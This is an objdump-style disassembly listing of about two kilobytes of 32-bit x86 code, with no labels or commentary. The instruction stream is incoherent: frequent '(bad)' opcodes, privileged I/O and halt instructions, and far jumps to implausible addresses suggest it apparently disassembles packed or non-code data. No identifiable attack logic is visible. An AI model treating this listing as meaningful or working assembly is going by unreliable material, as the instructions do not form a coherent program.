  41a9fc:	push   esp
  41a9fd:	inc    eax
  41a9fe:	jmp    0x5b90c0a2
  41aa03:	call   0x3662:0x3fc34c94
  41aa0a:	fsubp  st(3),st
  41aa0c:	jns    0x41a9ea
  41aa0e:	jo     0x41a9d9
  41aa10:	(bad)
  41aa14:	xor    edi,DWORD PTR [esi-0x270b0a2a]
  41aa1a:	cmp    DWORD PTR [ecx-0x53],ebp
  41aa1d:	dec    ecx
  41aa1e:	add    al,0x3c
  41aa20:	clc    
  41aa21:	pop    edi
  41aa22:	jmp    edi
  41aa24:	cwde   
  41aa25:	arpl   WORD PTR [edx],dx
  41aa27:	inc    ecx
  41aa28:	push   cs
  41aa29:	lahf   
  41aa2a:	inc    edx
  41aa2b:	sbb    DWORD PTR [edi],0x58bb1b9d
  41aa31:	mov    bh,0x2d
  41aa33:	cmc    
  41aa34:	bound  ebx,QWORD PTR [esi-0x2f0d0497]
  41aa3a:	pop    edx
  41aa3b:	jge    0x41aa19
  41aa3d:	add    DWORD PTR [edx-0x53],ecx
  41aa40:	and    DWORD PTR [edi+0x4ce37554],esp
  41aa46:	ret    
  41aa47:	ret    
  41aa48:	sbb    eax,0xd9644597
  41aa4d:	jge    0x41aaa7
  41aa4f:	je     0x41aa7e
  41aa51:	fdivr  st(6),st
  41aa53:	and    DWORD PTR [eax+0x5a],esi
  41aa56:	(bad)  
  41aa57:	xchg   ecx,eax
  41aa58:	xor    bl,bl
  41aa5a:	dec    ecx
  41aa5b:	sub    ebx,ecx
  41aa5d:	or     eax,ebx
  41aa5f:	mov    al,0x4e
  41aa61:	and    bh,ah
  41aa63:	sti    
  41aa64:	inc    edi
  41aa65:	wbinvd 
  41aa67:	hlt    
  41aa68:	or     edx,DWORD PTR [ebx+0x6c306992]
  41aa6e:	call   0x1d25930c
  41aa73:	fbstp  TBYTE PTR [esi]
  41aa75:	(bad)  
  41aa76:	jae    0x41aa06
  41aa78:	jns    0x41aa57
  41aa7a:	sti    
  41aa7b:	lds    edx,FWORD PTR [edx]
  41aa7d:	inc    ebx
  41aa7e:	inc    ebx
  41aa7f:	cs inc ecx
  41aa81:	ins    BYTE PTR es:[edi],dx
  41aa82:	pop    ds
  41aa83:	xor    DWORD PTR [ebx],ecx
  41aa85:	ret    
  41aa86:	jmp    0x702c4db7
  41aa8b:	push   es
  41aa8c:	adc    BYTE PTR [edx+0x6a],dl
  41aa8f:	es mov esi,0x7c0a3c9a
  41aa95:	dec    edx
  41aa96:	imul   ecx,ebp,0xffffff88
  41aa99:	cmp    al,0x35
  41aa9b:	add    al,0x98
  41aa9d:	sbb    edx,DWORD PTR [ebp+0x4f613f6a]
  41aaa3:	lds    edi,FWORD PTR [eax]
  41aaa5:	mov    ebx,0xcc099aa3
  41aaaa:	cli    
  41aaab:	jns    0x41aaba
  41aaad:	sbb    al,0x8f
  41aaaf:	cmp    edx,DWORD PTR [ebx-0x75e26398]
  41aab5:	in     al,dx
  41aab6:	dec    ebx
  41aab7:	sub    esp,edi
  41aab9:	test   eax,0x7d6491b6
  41aabe:	mov    dh,0x74
  41aac0:	xor    eax,0xb3935377
  41aac5:	imul   ecx,DWORD PTR [eax+0x4e40d8d1],0x3
  41aacc:	mov    fs,WORD PTR [esi]
  41aace:	and    ch,BYTE PTR [ebp-0x7f]
  41aad1:	mul    BYTE PTR [ebx]
  41aad3:	xchg   BYTE PTR [ebx+0x7d11bfdc],dl
  41aad9:	sahf   
  41aada:	(bad)  
  41aadb:	dec    ebp
  41aadc:	icebp  
  41aadd:	adc    al,0x62
  41aadf:	test   DWORD PTR [ebx+0x6f],0xd0132c0e
  41aae6:	inc    esi
  41aae7:	fbld   TBYTE PTR [edi]
  41aae9:	pop    ebp
  41aaea:	and    al,0x23
  41aaec:	arpl   WORD PTR [eax],bp
  41aaee:	xchg   DWORD PTR [ebx],ebx
  41aaf0:	je     0x41aa99
  41aaf2:	(bad)  
  41aaf3:	fnstenv [ecx+0xd31e33d]
  41aaf9:	cmp    al,0x10
  41aafb:	sub    DWORD PTR [ebp-0x29153c73],0xffffff8f
  41ab02:	xor    al,BYTE PTR [ecx-0x80]
  41ab05:	and    esp,edi
  41ab07:	fstp   TBYTE PTR [ebx]
  41ab09:	aas    
  41ab0a:	aas    
  41ab0b:	dec    esp
  41ab0c:	(bad)  
  41ab0e:	mov    al,0x73
  41ab10:	stos   DWORD PTR es:[edi],eax
  41ab11:	xchg   edx,eax
  41ab12:	retf   0xa4ca
  41ab15:	fist   DWORD PTR [edx+ecx*1-0x4f9195f6]
  41ab1c:	push   ebx
  41ab1d:	push   ebp
  41ab1e:	sbb    ecx,DWORD PTR [ebp-0x38]
  41ab21:	jmp    DWORD PTR [eax+0x17]
  41ab24:	add    DWORD PTR [eax-0x7bf5c123],edx
  41ab2a:	scas   eax,DWORD PTR es:[edi]
  41ab2b:	jle    0x41ab09
  41ab2d:	mov    edi,0x6f216244
  41ab32:	xchg   edi,eax
  41ab33:	add    bh,ch
  41ab35:	jmp    0x4834b8ae
  41ab3a:	scas   eax,DWORD PTR es:[edi]
  41ab3b:	adc    bh,bh
  41ab3d:	and    bl,BYTE PTR [edx-0x37c2b9b1]
  41ab43:	mov    DWORD PTR [edi],esi
  41ab45:	and    dh,BYTE PTR [eax-0x1d8d6dd4]
  41ab4b:	js     0x41abcb
  41ab4d:	into   
  41ab4e:	adc    BYTE PTR [ecx+ecx*8+0x14],ah
  41ab52:	add    DWORD PTR [ebx-0x4c],esp
  41ab55:	sbb    dh,BYTE PTR [edx-0x75]
  41ab58:	jae    0x41ab7a
  41ab5a:	(bad)  
  41ab5b:	jmp    0xa2bd:0xe8e56c91
  41ab62:	push   0xfffffffd
  41ab64:	or     al,0x67
  41ab66:	jo     0x41ab24
  41ab68:	jae    0x41ab37
  41ab6a:	cs stc 
  41ab6c:	or     DWORD PTR [ecx],ebp
  41ab6e:	(bad)  
  41ab70:	lods   al,BYTE PTR ds:[esi]
  41ab71:	js     0x41ab99
  41ab73:	clc    
  41ab74:	aas    
  41ab75:	cld    
  41ab76:	gs pop es
  41ab78:	mov    al,bh
  41ab7a:	out    0x49,eax
  41ab7c:	ins    DWORD PTR es:[edi],dx
  41ab7d:	imul   ebp,esp,0x57
  41ab80:	ret    0x1b91
  41ab83:	mov    ecx,0xc3837ad2
  41ab88:	or     ebp,DWORD PTR [ecx+0x3fbef77c]
  41ab8e:	jmp    0x854:0xabecc852
  41ab95:	jmp    0x41ab73
  41ab97:	scas   al,BYTE PTR es:[edi]
  41ab98:	dec    edi
  41ab99:	or     DWORD PTR [edx],0x601fdfd7
  41ab9f:	gs sub cl,bl
  41aba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aba3:	outs   dx,BYTE PTR ds:[esi]
  41aba4:	add    al,0xae
  41aba6:	adc    eax,0x865a2592
  41abab:	mov    ds:0x37ebf4d1,eax
  41abb0:	ror    DWORD PTR [ecx-0x574a2fea],1
  41abb6:	mov    eax,ds:0xa22fded0
  41abbb:	(bad)  
  41abbc:	iret   
  41abbd:	xor    edx,DWORD PTR [edx+0x59]
  41abc0:	or     bl,0x45
  41abc3:	mov    esi,0x12af479d
  41abc8:	mov    ds:0xc8abcaf9,eax
  41abcd:	jmp    0x15d5d796
  41abd2:	out    dx,al
  41abd3:	aaa    
  41abd4:	adc    ah,BYTE PTR [eax]
  41abd6:	lods   al,BYTE PTR ds:[esi]
  41abd7:	popf   
  41abd8:	test   DWORD PTR [edi+0x31],edi
  41abdb:	inc    edx
  41abdc:	or     BYTE PTR [esi],bh
  41abde:	mov    al,BYTE PTR [ebp-0x70f86978]
  41abe4:	out    dx,eax
  41abe5:	jae    0x41ac2e
  41abe7:	dec    edx
  41abe8:	leave  
  41abe9:	cmp    al,0x7a
  41abeb:	dec    eax
  41abec:	jg     0x41ab8d
  41abee:	xor    bh,bh
  41abf0:	addr16 pop ebx
  41abf2:	call   0x6401:0xed21ff5e
  41abf9:	push   ebp
  41abfa:	hlt    
  41abfb:	cmp    esi,DWORD PTR [edx]
  41abfd:	ss jae 0x41ac1b
  41ac00:	bound  esi,QWORD PTR ds:0x74a43167
  41ac06:	jge    0x41ac2f
  41ac08:	shl    DWORD PTR [ebx],cl
  41ac0a:	(bad)  
  41ac0b:	in     al,0xa4
  41ac0d:	(bad)  
  41ac0e:	jae    0x41ab90
  41ac10:	ss pop esp
  41ac12:	xor    eax,0xc3ef5815
  41ac17:	xor    dl,BYTE PTR [ebp-0x5b7c355d]
  41ac1d:	add    eax,0xf6c3322c
  41ac22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac23:	and    al,0x29
  41ac25:	or     dl,BYTE PTR [edx]
  41ac27:	outs   dx,DWORD PTR ds:[esi]
  41ac28:	or     DWORD PTR [ebp-0x10dad652],esp
  41ac2e:	mov    dh,0x88
  41ac30:	out    dx,eax
  41ac31:	bnd jp 0x41ac7b
  41ac34:	sbb    al,0xc0
  41ac36:	xor    DWORD PTR [ebp-0xc9d8c62],ebp
  41ac3c:	scas   eax,DWORD PTR es:[edi]
  41ac3d:	outs   dx,DWORD PTR ds:[esi]
  41ac3e:	or     al,BYTE PTR [ecx+0x4c]
  41ac41:	inc    ecx
  41ac42:	mov    ds:0xbd7b1d73,al
  41ac47:	add    edi,esi
  41ac49:	and    BYTE PTR [edx+esi*1+0x40617887],ch
  41ac50:	push   ds
  41ac51:	dec    esp
  41ac52:	dec    ebx
  41ac53:	mov    edi,0x3ebd3be4
  41ac58:	mov    fs,ebp
  41ac5a:	xlat   BYTE PTR ds:[ebx]
  41ac5b:	repnz out 0x93,al
  41ac5e:	adc    eax,0x1774acab
  41ac63:	aam    0xf8
  41ac65:	dec    edx
  41ac66:	jle    0x41ac3f
  41ac68:	out    0xa1,eax
  41ac6a:	lods   eax,DWORD PTR ds:[esi]
  41ac6b:	(bad)  
  41ac6c:	pop    ecx
  41ac6d:	mov    esi,0x55e6cd31
  41ac72:	das    
  41ac73:	dec    edx
  41ac74:	adc    BYTE PTR [ebx-0x71],0xbe
  41ac78:	xor    esi,esi
  41ac7a:	cmp    eax,0xca0ee427
  41ac7f:	dec    eax
  41ac80:	ds loope 0x41ac32
  41ac83:	sbb    dh,dl
  41ac85:	rcr    DWORD PTR [ecx+0x73],cl
  41ac88:	ins    DWORD PTR es:[edi],dx
  41ac89:	inc    ebx
  41ac8a:	mov    al,0x61
  41ac8c:	xchg   edx,eax
  41ac8d:	dec    ebx
  41ac8e:	mov    ecx,0x44e70783
  41ac93:	xchg   edi,eax
  41ac94:	aas    
  41ac95:	cmp    DWORD PTR [edi-0x49],ebx
  41ac98:	add    edx,DWORD PTR [eax]
  41ac9a:	add    al,0x55
  41ac9c:	adc    al,0x2b
  41ac9e:	jnp    0x41ad00
  41aca0:	ror    BYTE PTR [ebx-0x63],cl
  41aca3:	jmp    0x153f2af8
  41aca8:	jb     0x41ad20
  41acaa:	pop    es
  41acab:	sbb    bh,BYTE PTR [edi+0x75]
  41acae:	(bad)  
  41acaf:	ja     0x41ac57
  41acb1:	mov    ds:0x9c03c9d0,eax
  41acb6:	call   0x1338986c
  41acbb:	inc    edi
  41acbc:	test   ecx,esi
  41acbe:	push   ebp
  41acbf:	or     esi,DWORD PTR [ebp+0x66442892]
  41acc5:	sbb    DWORD PTR [ebx+0x74650abf],esi
  41accb:	pop    ebx
  41accc:	leave  
  41accd:	int    0xb6
  41accf:	(bad)  
  41acd0:	in     al,0x78
  41acd2:	in     al,0xdc
  41acd4:	cmp    ecx,DWORD PTR ds:0xf61eb897
  41acda:	fs jecxz 0x41ac90
  41acdd:	pop    esi
  41acde:	jae    0x41ac7b
  41ace0:	push   eax
  41ace1:	mov    ah,0xfd
  41ace3:	imul   ebp,esp,0xe4fb5299
  41ace9:	out    dx,eax
  41acea:	cmp    ch,cl
  41acec:	call   0xc60305ed
  41acf1:	sbb    DWORD PTR [ebx+0x4fc6bbb8],edi
  41acf7:	out    dx,eax
  41acf8:	and    bl,bh
  41acfa:	in     al,0xca
  41acfc:	xor    al,0x67
  41acfe:	pushf  
  41acff:	add    BYTE PTR [eax-0x15c8861a],ah
  41ad05:	mov    dh,0x18
  41ad07:	dec    edi
  41ad08:	mov    BYTE PTR [ebx+0x55],dh
  41ad0b:	adc    BYTE PTR [edi+0x3ee7f8ce],ch
  41ad11:	jmp    0x41ac9e
  41ad13:	or     dl,BYTE PTR [ebp-0x1d883a91]
  41ad19:	sbb    BYTE PTR [eax],cl
  41ad1b:	or     ebp,ebp
  41ad1d:	in     eax,dx
  41ad1e:	and    al,BYTE PTR ds:0x194601af
  41ad24:	sub    BYTE PTR [eax-0x49],ah
  41ad27:	in     eax,dx
  41ad28:	lock popf 
  41ad2a:	mov    WORD PTR [ebx+ebx*4],ss
  41ad2d:	mov    ebp,0x97331ca2
  41ad32:	mov    ecx,0x1860ea8c
  41ad37:	fcomi  st,st(7)
  41ad39:	pop    esi
  41ad3a:	xchg   DWORD PTR ds:0xcb8977cf,ebp
  41ad40:	cmp    bl,bl
  41ad42:	shl    DWORD PTR [edi],0x56
  41ad45:	mov    cs,WORD PTR [edi+0x80d2b73]
  41ad4b:	test   BYTE PTR [ebp+0x3],ch
  41ad4e:	push   es
  41ad4f:	icebp  
  41ad50:	iret   
  41ad51:	jae    0x41adbf
  41ad53:	sbb    al,BYTE PTR [eax-0x40]
  41ad56:	popf   
  41ad57:	adc    DWORD PTR [ecx+0x4a4c996b],ebp
  41ad5d:	jmp    DWORD PTR [ebp-0x7d]
  41ad60:	mov    ah,0x10
  41ad62:	aam    0xf0
  41ad64:	out    dx,al
  41ad65:	sbb    ebx,DWORD PTR [eax-0x1a]
  41ad68:	jge    0x41acfc
  41ad6a:	lods   eax,DWORD PTR ds:[esi]
  41ad6b:	inc    eax
  41ad6c:	hlt    
  41ad6d:	inc    BYTE PTR [ebx+ebx*8+0x17]
  41ad71:	ins    DWORD PTR es:[edi],dx
  41ad72:	pop    es
  41ad73:	push   ax
  41ad75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad76:	mov    dl,0x92
  41ad78:	in     al,0x59
  41ad7a:	push   es
  41ad7b:	push   esp
  41ad7c:	dec    esp
  41ad7d:	cs nop
  41ad7f:	int    0x50
  41ad81:	and    DWORD PTR [esi+0xe6406dc],ebx
  41ad87:	sahf   
  41ad88:	mov    bl,0xaa
  41ad8a:	fisub  DWORD PTR [bp+si]
  41ad8d:	test   al,0xbf
  41ad8f:	into   
  41ad90:	rcl    DWORD PTR [esi+0x5a],0xf5
  41ad94:	and    BYTE PTR [ecx+0x3f0200fe],dh
  41ad9a:	xor    ebp,DWORD PTR [eax]
  41ad9c:	push   ebx
  41ad9d:	adc    eax,DWORD PTR [ecx]
  41ad9f:	into   
  41ada0:	daa    
  41ada1:	or     BYTE PTR [ebx+0x719e3236],ch
  41ada7:	xchg   edi,eax
  41ada8:	mov    dl,0x7c
  41adaa:	mov    eax,ds:0x97c985c5
  41adaf:	(bad)  
  41adb0:	or     ebp,DWORD PTR [edx-0x39]
  41adb3:	imul   esi,DWORD PTR [eax],0xbc784bff
  41adb9:	iret   
  41adba:	fcmovbe st,st(7)
  41adbc:	sbb    DWORD PTR [ebx+0x516d5887],esp
  41adc2:	sbb    al,bl
  41adc4:	add    eax,DWORD PTR [ecx-0x5fd0c484]
  41adca:	ins    DWORD PTR es:[edi],dx
  41adcb:	push   edi
  41adcc:	lods   al,BYTE PTR ds:[esi]
  41adcd:	add    bh,cl
  41adcf:	data16 aad 0x58
  41add2:	xchg   ebp,eax
  41add3:	xchg   ebx,eax
  41add4:	fwait
  41add5:	jno    0x41ae4e
  41add7:	xchg   edx,eax
  41add8:	xchg   BYTE PTR [esi],cl
  41adda:	loope  0x41ad5e
  41addc:	rol    DWORD PTR [edx+0x33],cl
  41addf:	(bad)  
  41ade0:	ja     0x41ae45
  41ade2:	mov    ds:0xbd46c1b2,al
  41ade7:	jge    0x41ae4e
  41ade9:	mov    ebp,0x72ea2e08
  41adee:	dec    edi
  41adef:	aad    0x3a
  41adf1:	xchg   ecx,eax
  41adf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adf3:	sti    
  41adf4:	cdq    
  41adf5:	xor    al,0xef
  41adf7:	mov    ds:0x97017a0f,eax
  41adfc:	adc    al,0x86
  41adfe:	xchg   ecx,eax
  41adff:	mov    dl,0x45
  41ae01:	dec    edx
  41ae02:	bnd jns 0x41ae59
  41ae05:	ds cwde 
  41ae07:	retf   
  41ae08:	clc    
  41ae09:	mov    BYTE PTR [edi+0x4fb53bdf],al
  41ae0f:	dec    ebp
  41ae10:	(bad)
  41ae13:	jno    0x41add5
  41ae15:	arpl   WORD PTR [ecx-0x33],sp
  41ae18:	inc    esi
  41ae19:	(bad)  
  41ae1a:	call   0x694:0xea2143b9
  41ae21:	push   es
  41ae22:	shr    DWORD PTR [ebp+0x2ed0e7],1
  41ae28:	jo     0x41ae88
  41ae2a:	and    ecx,DWORD PTR [ebp+0x2b3ab3de]
  41ae30:	xchg   edx,eax
  41ae31:	jmp    0x43d7da55
  41ae36:	mov    eax,0x83e7425c
  41ae3b:	add    al,cl
  41ae3d:	mov    BYTE PTR [edi+0x29],bl
  41ae40:	pusha  
  41ae41:	imul   eax,DWORD PTR [edx],0xffffff98
  41ae44:	jbe    0x41ae7b
  41ae46:	sahf   
  41ae47:	icebp  
  41ae48:	loopne 0x41ae67
  41ae4a:	lods   al,BYTE PTR ds:[esi]
  41ae4b:	pushf  
  41ae4c:	es mov eax,0xcb219243
  41ae52:	or     bh,dl
  41ae54:	lahf   
  41ae55:	pop    ebx
  41ae56:	loopne 0x41ae9e
  41ae58:	xchg   BYTE PTR [ebx-0x5e],dl
  41ae5b:	jmp    0x41ade0
  41ae5d:	es popa 
  41ae5f:	push   esi
  41ae60:	shl    BYTE PTR [edi+0x3cdf86c5],1
  41ae66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae67:	cmp    BYTE PTR [edi-0x62b55b58],bl
  41ae6d:	dec    eax
  41ae6e:	mov    ah,bh
  41ae70:	fisttp WORD PTR [edi+0x6f]
  41ae73:	nop
  41ae74:	and    ah,0x56
  41ae77:	pop    ss
  41ae78:	mov    al,0x63
  41ae7a:	call   0x1954e54d
  41ae7f:	or     DWORD PTR [edx+0x6f],eax
  41ae82:	mov    BYTE PTR [eax+0x3bcb3963],cl
  41ae88:	xchg   esp,eax
  41ae89:	mov    ebp,0xd1afeb3a
  41ae8e:	pop    esp
  41ae8f:	cld    
  41ae90:	dec    eax
  41ae91:	sbb    dl,dh
  41ae93:	test   DWORD PTR [ebx],ebx
  41ae95:	push   0x21
  41ae97:	xchg   ebp,eax
  41ae98:	ror    BYTE PTR [ecx],0x56
  41ae9b:	xchg   esi,esp
  41ae9d:	ret    
  41ae9e:	pop    esp
  41ae9f:	lock in al,0xf8
  41aea2:	jae    0x41ae5e
  41aea4:	jae    0x41ae2a
  41aea6:	add    eax,DWORD PTR [edi+0x7056f9a1]
  41aeac:	rcl    BYTE PTR [eax-0x1104dd5a],cl
  41aeb2:	xchg   esi,eax
  41aeb3:	rcl    DWORD PTR [ecx],0x9a
  41aeb6:	sub    eax,0x73710d82
  41aebb:	or     bl,bl
  41aebd:	outs   dx,DWORD PTR ds:[esi]
  41aebe:	addr16 (bad) 
  41aec0:	aam    0x29
  41aec2:	mov    al,0xe8
  41aec4:	fs nop
  41aec6:	or     bh,BYTE PTR [ecx+0x25]
  41aec9:	add    ecx,DWORD PTR [ebx+0x7b]
  41aecc:	enter  0x61aa,0x46
  41aed0:	test   eax,0xe98f4dff
  41aed5:	add    DWORD PTR [ebp+0x4f],edi
  41aed8:	cmp    ch,BYTE PTR [ecx-0x6c3c1418]
  41aede:	jp     0x5b85e474
  41aee4:	xor    ch,0x2e
  41aee7:	xchg   edi,eax
  41aee8:	(bad)  [ebx]
  41aeea:	fidiv  DWORD PTR [ecx*1+0x5985edf2]
  41aef1:	neg    DWORD PTR [edi]
  41aef3:	in     eax,dx
  41aef4:	stos   BYTE PTR es:[edi],al
  41aef5:	xor    eax,0xf2b3623a
  41aefa:	dec    ebp
  41aefb:	out    0x34,al
  41aefd:	dec    eax
  41aefe:	je     0x41aeb6
  41af00:	push   ebx
  41af01:	rol    BYTE PTR [edi+esi*2],cl
  41af04:	add    edx,DWORD PTR [edx+0x1ff65c8a]
  41af0a:	xchg   ebp,eax
  41af0b:	sahf   
  41af0c:	add    ch,bh
  41af0e:	mov    DWORD PTR [eax+ecx*4+0x1bae3d27],eax
  41af15:	xor    DWORD PTR gs:[ebp-0x28181067],esp
  41af1c:	fisubr WORD PTR [edi+eax*8-0x661cbf36]
  41af23:	cmp    edx,DWORD PTR [ebx+eiz*8-0x58]
  41af27:	call   0xe647:0xa496fa7f
  41af2e:	push   0xb0096a96
  41af33:	cmp    ecx,DWORD PTR [edi-0x57c6b793]
  41af39:	xchg   bl,cl
  41af3b:	inc    edx
  41af3c:	xor    eax,0x7c390030
  41af41:	mov    esp,0x76b558c3
  41af46:	arpl   WORD PTR [edi],dx
  41af48:	add    DWORD PTR [esi],edi
  41af4a:	xlat   BYTE PTR ds:[ebx]
  41af4b:	imul   ecx,DWORD PTR ds:0xdf24fafe,0xbbc43c93
  41af55:	xchg   DWORD PTR [ebp-0x45577ef4],ecx
  41af5b:	repnz dec edi
  41af5d:	(bad)
  41af61:	popf   
  41af62:	ins    BYTE PTR es:[edi],dx
  41af63:	outs   dx,DWORD PTR ds:[esi]
  41af64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af65:	dec    ecx
  41af66:	xchg   esp,eax
  41af67:	sub    BYTE PTR [edi+0x1de164f3],bh
  41af6d:	xchg   esp,eax
  41af6e:	push   edx
  41af6f:	sub    BYTE PTR [eax-0x393f8cf1],bh
  41af75:	out    0xda,eax
  41af77:	sub    eax,0x6d831a6a
  41af7c:	push   esp
  41af7d:	xchg   edx,eax
  41af7e:	mov    ecx,0xebc94f4c
  41af83:	repz cmp DWORD PTR [edi-0x338e1b89],0xe39b867
  41af8e:	sar    bh,1
  41af90:	inc    ebp
  41af91:	or     al,0xd0
  41af93:	adc    dl,BYTE PTR [ebx+ebx*8-0x60]
  41af97:	pusha  
  41af98:	test   DWORD PTR [edx+0x38e747fb],eax
  41af9e:	scas   eax,DWORD PTR es:[edi]
  41af9f:	or     BYTE PTR [eax],cl
  41afa1:	retf   
  41afa2:	sub    al,0xf
  41afa4:	inc    esp
  41afa5:	ja     0x41b001
  41afa7:	push   esp
  41afa8:	into   
  41afa9:	mov    cs,WORD PTR [esi+0x10230456]
  41afaf:	xchg   ecx,eax
  41afb0:	dec    esi
  41afb1:	pop    ds
  41afb2:	jge    0x41aff3
  41afb4:	push   edi
  41afb5:	cmp    dl,ah
  41afb7:	jno    0x41af63
  41afb9:	jmp    0x41afd8
  41afbb:	or     BYTE PTR [ebx],ah
  41afbd:	pushf  
  41afbe:	push   edi
  41afbf:	out    dx,al
  41afc0:	and    eax,0x2c8665d2
  41afc5:	inc    ebp
  41afc6:	je     0x41aff5
  41afc8:	and    BYTE PTR [esi-0x26d31455],0x5c
  41afcf:	push   edi
  41afd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afd1:	push   ss
  41afd2:	out    0x25,eax
  41afd4:	shl    BYTE PTR [ebx+0x62],cl
  41afd7:	xchg   edi,eax
  41afd8:	aaa    
  41afd9:	mov    al,0x84
  41afdb:	sbb    DWORD PTR [ebp-0x4aa0f241],0x66
  41afe2:	pop    ebp
  41afe3:	add    BYTE PTR [ebp-0x55000b24],cl
  41afe9:	sbb    eax,0xf3dcd393
  41afee:	pop    esi
  41afef:	sbb    al,BYTE PTR [eax-0x3d]
  41aff2:	in     al,0x2e
  41aff4:	int3   
  41aff5:	sub    edi,ecx
  41aff7:	int    0xf4
  41aff9:	jmp    0x41afda
  41affb:	cs mov cl,0xf5
  41affe:	and    DWORD PTR [edx],0x10
  41b001:	mov    dh,0xbe
  41b003:	and    dh,BYTE PTR [esi+0x7b2b8f59]
  41b009:	int3   
  41b00a:	popa   
  41b00b:	imul   edi,DWORD PTR [ecx-0x29772384],0x25d91340
  41b015:	mov    al,0x64
  41b017:	out    dx,eax
  41b018:	mov    cl,0x2c
  41b01a:	fmul   DWORD PTR [ecx-0x12]
  41b01d:	xchg   edi,eax
  41b01e:	ret    
  41b01f:	jne    0x41b09e
  41b021:	pop    ds
  41b022:	(bad)  [edx]
  41b024:	and    esp,DWORD PTR [esi+0x127e6a43]
  41b02a:	mov    ah,0xac
  41b02c:	icebp  
  41b02d:	jne    0x41b081
  41b02f:	or     BYTE PTR [ecx-0x64ab3235],bl
  41b035:	pop    edx
  41b036:	mov    ds:0x846f1359,al
  41b03b:	lods   eax,DWORD PTR ds:[esi]
  41b03c:	mov    ebp,0x7442ee5d
  41b041:	cmp    al,0x19
  41b043:	mov    ebx,0x566c743
  41b048:	jmp    edi
  41b04a:	xor    BYTE PTR [ecx+ecx*2-0x7f],al
  41b04e:	dec    edx
  41b04f:	fstp   DWORD PTR [edx-0x60a4af9d]
  41b055:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b056:	loopne 0x41afe7
  41b058:	and    al,0x60
  41b05a:	icebp  
  41b05b:	xchg   ebx,eax
  41b05c:	fsub   DWORD PTR [ebp-0x46]
  41b05f:	push   cs
  41b060:	sahf   
  41b061:	imul   esp,DWORD PTR [ebx+0x7a71ddbc],0xe23ada7a
  41b06b:	cmp    BYTE PTR ds:0x535543f,al
  41b071:	shr    DWORD PTR [ebp+0x56],1
  41b074:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b075:	fisttp WORD PTR ss:[eax-0x607ac230]
  41b07c:	jnp    0x41b0e2
  41b07e:	int    0x12
  41b080:	jo     0x41b02f
  41b082:	jns    0x41b093
  41b084:	(bad)  [esp+edx*4]
  41b087:	xor    esi,esi
  41b089:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b08a:	jne    0x41b0d3
  41b08c:	push   0xffffffdf
  41b08e:	pop    eax
  41b08f:	add    al,0x5b
  41b091:	cmp    edi,esp
  41b093:	sub    eax,0xb72fa6ce
  41b098:	jecxz  0x41b105
  41b09a:	(bad)  
  41b09b:	cmp    ebx,edi
  41b09d:	sbb    eax,0xa535ce8d
  41b0a2:	and    BYTE PTR [esi+0x43c931cf],dl
  41b0a8:	out    dx,al
  41b0a9:	push   ecx
  41b0aa:	mov    ecx,0x50d4dc07
  41b0af:	ss out dx,al
  41b0b1:	int    0x89
  41b0b3:	push   esp
  41b0b4:	pop    es
  41b0b5:	jnp    0x41b0a3
  41b0b7:	xor    BYTE PTR [edi+0x5b02881d],ah
  41b0bd:	les    ebx,FWORD PTR [esp+eax*1]
  41b0c0:	repnz stos BYTE PTR es:[edi],al
  41b0c2:	dec    ebp
  41b0c3:	fs adc eax,0x7ad3a5b9
  41b0c9:	sbb    al,0xdb
  41b0cb:	push   edi
  41b0cc:	push   cs
  41b0cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0ce:	call   0x3b1d:0x714afb41
  41b0d5:	fwait
  41b0d6:	test   eax,0xc505f55f
  41b0db:	stc    
  41b0dc:	adc    ebp,DWORD PTR [esi]
  41b0de:	push   esp
  41b0df:	ins    BYTE PTR es:[edi],dx
  41b0e0:	inc    esp
  41b0e1:	les    ebx,FWORD PTR ds:0xcbb49b8
  41b0e7:	popf   
  41b0e8:	cmp    al,0x8c
  41b0ea:	push   ss
  41b0eb:	cmp    BYTE PTR [edi-0x75],dh
  41b0ee:	ins    BYTE PTR es:[edi],dx
  41b0ef:	dec    ebx
  41b0f0:	or     DWORD PTR [edi+ecx*8-0x71],ebx
  41b0f4:	push   cs
  41b0f5:	repnz add ebx,DWORD PTR ds:0xfd1803f4
  41b0fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0fd:	dec    esi
  41b0fe:	pop    ecx
  41b0ff:	adc    al,0x7b
  41b101:	or     BYTE PTR [ebp-0x24f3c33d],bl
  41b107:	push   edi
  41b108:	xlat   BYTE PTR ds:[ebx]
  41b109:	xor    eax,0xfdf0418a
  41b10e:	push   ds
  41b10f:	mov    edx,0x53d74c51
  41b114:	pop    esp
  41b115:	jns    0x41b0b2
  41b117:	push   esp
  41b118:	gs push ecx
  41b11a:	repz jb 0x41b0a9
  41b11d:	sub    DWORD PTR [esi-0x40],ecx
  41b120:	pushf  
  41b121:	mov    cl,0xda
  41b123:	aaa    
  41b124:	and    DWORD PTR [edx+0x18bf6e1],edi
  41b12a:	repnz dec di
  41b12d:	retf   0xbe5c
  41b130:	inc    edx
  41b131:	jp     0x41b160
  41b133:	test   DWORD PTR [ebp-0x27],eax
  41b136:	std    
  41b137:	sub    DWORD PTR [esi-0x68],edx
  41b13a:	inc    BYTE PTR fs:[ebx+ebx*8+0x3f]
  41b13f:	xchg   ebx,eax
  41b140:	mov    bl,dh
  41b142:	sub    bh,BYTE PTR [ebp-0x2919eb09]
  41b148:	into   
  41b149:	push   esp
  41b14a:	lods   eax,DWORD PTR ds:[esi]
  41b14b:	cdq    
  41b14c:	rcr    BYTE PTR [ebp+ebx*2-0x6eda6630],0xae
  41b154:	(bad)  
  41b155:	push   0xfffffffc
  41b157:	addr16 mov edx,0xed5a9e99
  41b15d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b15e:	cld    
  41b15f:	(bad)  
  41b160:	xor    BYTE PTR [esi+0x746d6518],ch
  41b166:	xor    eax,0x1a717fcf
  41b16b:	lods   al,BYTE PTR ds:[esi]
  41b16d:	xor    ah,BYTE PTR [ebx]
  41b16f:	add    eax,0x2b0faeef
